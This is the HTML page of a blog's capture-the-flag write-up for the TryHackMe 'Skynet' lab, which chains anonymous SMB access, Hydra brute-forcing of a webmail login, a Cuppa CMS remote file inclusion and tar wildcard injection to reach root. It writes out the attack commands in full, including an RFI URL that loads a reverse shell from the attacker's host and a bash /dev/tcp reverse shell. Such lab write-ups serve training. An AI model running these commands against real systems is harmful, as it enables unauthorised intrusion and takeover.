@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Skynet | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-easy">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="webmail"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="rfi"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="verdict"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Easy</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge easy">Easy</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · Linux · SMB → Web → RFI → Cron privesc</div>
+    <h1 class="wu-title">Skynet</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-09-22</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent easy">Easy</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">5</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">smbclient</span>
+    <span class="tool-tag">hydra</span>
+    <span class="tool-tag">gobuster</span>
+    <span class="tool-tag">searchsploit</span>
+    <span class="tool-tag">RFI</span>
+    <span class="tool-tag">tar wildcard injection</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Skynet</strong> is a Terminator-themed Linux box that chains together several classic misconfigurations. The path runs from anonymous SMB access to a leaked password list, into a webmail login, then pivots to a hidden CMS vulnerable to Remote File Inclusion. Root comes from a wildcard injection in a root-owned cron job.</p>
+    <p><a href="https://tryhackme.com/room/skynet" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags, credentials, and puzzle answers have been redacted per TryHackMe's write-up policy.</em></p>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port Scanning</h3>
+    <p>A full-port scan with default scripts and version detection exposes the core services:</p>
+
+    <pre>$ nmap -sC -sV &lt;target_ip&gt;
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu
+80/tcp    open  http        Apache httpd 2.4.18
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X</pre>
+
+    <h3>SMB Enumeration</h3>
+    <p>The SMB service is the most interesting initial target. Listing shares shows an <strong>anonymous</strong> share that accepts null authentication:</p>
+
+    <pre>$ smbclient -L //&lt;target_ip&gt;/ -N
+$ smbclient //&lt;target_ip&gt;/anonymous -N</pre>
+
+    <p>Inside the <code>logs</code> directory sits <code>log1.txt</code> — a short password list. A second file, <code>attention.txt</code>, names <strong>Miles Dyson</strong> and warns about a recent password reset. That's a username and a candidate password list in one shot.</p>
+
+    <div class="takeaway" style="margin: 1.5rem 0;">
+      <strong>Pro tip:</strong> Anonymous SMB shares are almost always worth a look. A leaked password list plus a named user is a brute-force waiting to happen — no wordlist required.
+    </div>
+
+    <h2 id="webmail">// SMB → Webmail</h2>
+
+    <h3>Brute-Forcing SquirrelMail</h3>
+    <p>The web server hosts <strong>SquirrelMail</strong> at <code>/squirrelmail</code>. Pointing Hydra at the login form with the username <code>milesdyson</code> and the password list from the SMB share yields a hit:</p>
+
+    <pre>$ hydra -l milesdyson -P log1.txt &lt;target_ip&gt; \
+  http-post-form "/squirrelmail/src/redirect.php:\
+  login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:\
+  F=Unknown User or password incorrect"</pre>
+
+    <p><strong>Q1 Answer:</strong> Miles' email password is found in <code>log1.txt</code> — a short dictionary word with a Terminator-themed twist. <code>[redacted]</code>.</p>
+
+    <h3>Pivoting to Miles' SMB Share</h3>
+    <p>Logging into the mailbox reveals a <strong>Samba Password reset</strong> email. The new password grants access to Miles' personal SMB share:</p>
+
+    <pre>$ smbclient //&lt;target_ip&gt;/milesdyson -U milesdyson
+Password: [redacted]</pre>
+
+    <p>Inside a <code>notes</code> directory, <code>important.txt</code> contains:</p>
+
+    <pre>1. Add features to beta CMS /[redacted]
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife</pre>
+
+    <p><strong>Q2 Answer:</strong> The hidden directory is named in <code>important.txt</code> — a 16-character alphanumeric string. <code>[redacted]</code>.</p>
+
+    <h2 id="rfi">// Hidden CMS → Remote File Inclusion</h2>
+
+    <p>Browsing to the hidden directory shows a personal page. Directory brute-forcing against this new path reveals an <code>/administrator</code> subdirectory, which loads a <strong>Cuppa CMS</strong> login panel. A quick <code>searchsploit</code> search identifies a Remote File Inclusion vulnerability in <code>alertConfigField.php</code>:</p>
+
+    <pre>$ searchsploit cuppa cms
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion</pre>
+
+    <p><strong>Q3 Answer:</strong> The vulnerability is called <strong>Remote File Inclusion (RFI)</strong>.</p>
+
+    <p>Confirming the LFI side of the vuln is a good sanity check before weaponising it:</p>
+
+    <pre>http://&lt;target_ip&gt;/&lt;hidden_dir&gt;/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd</pre>
+
+    <p>To turn it into a shell, host a PHP reverse shell on the attacker box and point the RFI at it:</p>
+
+    <pre>$ python3 -m http.server 8000
+$ nc -lvnp 4444
+
+http://&lt;target_ip&gt;/&lt;hidden_dir&gt;/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;your_ip&gt;:8000/php-reverse-shell.php</pre>
+
+    <p>A listener on port 4444 catches a callback as <code>www-data</code>.</p>
+
+    <h3>User Flag</h3>
+    <p>The user flag sits in Miles' home directory and is readable by <code>www-data</code>:</p>
+
+    <pre>$ cat /home/milesdyson/user.txt
+THM{redacted}</pre>
+
+    <p><strong>Q4 Answer:</strong> The user flag is <code>THM{redacted}</code>.</p>
+
+    <h2 id="privesc">// Privilege Escalation — tar Wildcard Injection</h2>
+
+    <p>Checking cron jobs reveals that root runs a backup script every minute:</p>
+
+    <pre>$ cat /etc/crontab
+*/1 * * * * root /home/milesdyson/backups/backup.sh</pre>
+
+    <p>The script uses <code>tar</code> with a wildcard from within <code>/var/www/html</code>:</p>
+
+    <pre>cd /var/www/html &amp;&amp; tar -czf /var/backups/backup.tgz *</pre>
+
+    <p>That's vulnerable to <strong>tar wildcard injection</strong>. Because <code>www-data</code> can write to <code>/var/www/html</code>, we can create files with names that tar interprets as command-line options:</p>
+
+    <pre>$ echo "bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/4445 0&gt;&amp;1" &gt; shell.sh
+$ touch -- "--checkpoint=1"
+$ touch -- "--checkpoint-action=exec=bash shell.sh"</pre>
+
+    <p>When the cron job next fires, the wildcard expands to include those filenames, and tar executes <code>shell.sh</code> as root. A listener on 4445 catches the root shell.</p>
+
+    <pre>$ nc -lvnp 4445
+$ cat /root/root.txt
+THM{redacted}</pre>
+
+    <p><strong>Q5 Answer:</strong> The root flag is <code>THM{redacted}</code>.</p>
+
+    <div class="note">
+      <strong>Why this works:</strong> tar treats filenames beginning with <code>--</code> as options. <code>--checkpoint=1</code> forces tar to emit a checkpoint, and <code>--checkpoint-action=exec=…</code> runs a command at that checkpoint. The wildcard does the rest.
+    </div>
+
+    <h2 id="verdict">// Verdict</h2>
+    <p>Skynet is a satisfying room because every step leads logically to the next — no dead ends, just sloppy operational security compounding. The anonymous SMB share leaking a password list is the hook, and the tar wildcard injection is the payoff. The RFI in Cuppa CMS is a nice mid-game pivot that teaches you to reach for <code>searchsploit</code> as soon as you fingerprint a product.</p>
+    <p style="color: var(--text); font-size: 0.8rem;">
+      <span style="color: var(--room-accent, var(--accent));">→</span> 8/10 — recommended for anyone comfortable with basic SMB and web enumeration who wants to practice chaining credentials across services.
+    </p>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="pickle-rick.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Pickle Rick</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="stuxctf.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">StuxCTF</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
